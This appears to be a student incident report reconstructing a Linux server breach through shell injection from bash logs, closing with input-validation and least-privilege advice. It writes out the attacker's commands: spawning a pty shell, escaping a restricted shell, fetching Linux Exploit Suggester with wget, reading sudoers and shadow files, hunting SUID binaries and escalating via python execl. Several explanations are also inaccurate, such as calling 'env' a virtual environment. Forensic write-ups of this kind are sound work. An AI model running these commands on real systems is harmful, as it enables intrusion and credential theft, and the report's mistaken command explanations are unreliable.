# Linux Server Logs - Shell Injection
<b>INCIDENT REPORT: JA-16646-LinuxServerLogs</b>

## Executive Summary 
Information from a Linux server that was previously thought to be secure was found being traded for cryptocurrency on the dark web. The administrator is confused because he is using input sanitation to stop malicious .php files from being loaded and executed. The Linux server logs have been delivered for examination to determine how the security breach occurred. 

## Methodology 
- Bash logs
- Linux commands

## Findings/Results 
The hacker accessed the terminal and was able to execute malicious activities despite the filters in place.
- Malicious linux commands
- Linux Exploit Suggester - a package designed to assist in detecting security deficiencies, but it can also be exploited by hackers. 

![Linux Logs](https://github.com/serengetijade/Cyber_Security/blob/main/img/LinuxLogs.jpg)

### Attack Narrative 
Early linux commands show that the hacker started by gathering information about the current user, such as whoami, id, and so on. There are also many commands to discover the file structure, directories, and lists of contents. This information is then used for exploiting vulnerabilities. Additionally, the hacker accessed the Linux Exploit Suggester to help them find weaknesses and then proceeded to enter commands to gather more information. 

The directory was changed to /home/daniel/. This indicates that a user named daniel has accessed the server and then injected a shell os.
- cd /home/daniel/
- python -c 'import pty; pty.spawn("/bin/sh")'     
    is used to spawn an interactive shell
- echo os.system(‘/bin/bash’)     
    is the linux command to break out of the current restrictive shell. 

Daniel then installed the Linux Exploit Suggester: 
- wget https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -O les.sh

A virtual environment was started: 
- env

The current processes were displayed on the terminal: 
- ps -ef

Daniel also ran a packet analyzer: tcpdump
- tcpdump is a packet analyzer that is launched from the command line. Packet analyzers are used to monitor network traffic. 

Then several commands were used to gather additional information about the system: 
- cat /etc/sudoers     
    sudoers is a file Linux and Unix administrators use to allocate system rights to system users. 
- last     
    displays a list of users who have previously logged in to the system. 
- sudo -l     
    by adding sudo, it provides a way to temporarily grant users or user groups privileged access to system resources so that they can run commands that they cannot run under their regular accounts.
- cat commands : several cat commands are entered to access password, profiles, and shadow folders. 
- find / -type f -user root -perm -4000     
    is the command to find files that require root permission. 

Python was used to run a script inside of the virtual environment.  
- ./usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

The final log entry was to remove the shell that was being used. 
- rm /var/www/html/uploads/x.phtml


### Malicious HTTP traffic 
The Linux Exploit Suggester was downloaded from https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh

## Conclusion 
OS command injection, also known as shell injection, is a vulnerability that allows an attacker to execute arbitrary operating system (OS) commands on the server that is running an application, typically for the purpose of gathering (stealing) data. If a hacker can gain access to and submit commands to an OS, they can compromise other parts of the infrastructure and attack other parts of the system. 

Input sanitation is only one of many security techniques that should be administered to secure a system. Although it is being implemented, it must be strengthened to prevent this kind of attack. Additional validation that can be added may include: 
- Validating against a whitelist of permitted values.
- Validating that the input contains only alphanumeric characters, 
- Validating that there are no other syntax or whitespace (other than alphanumeric).
- Validating that the input is a number, when expected.

Restricting user privileges is another way to minimize this attack vector, so only the minimum tasks are possible to complete a user’s specific job. 

Finally, patches and upgrades should be kept up to date, and security testing should be done regularly. 
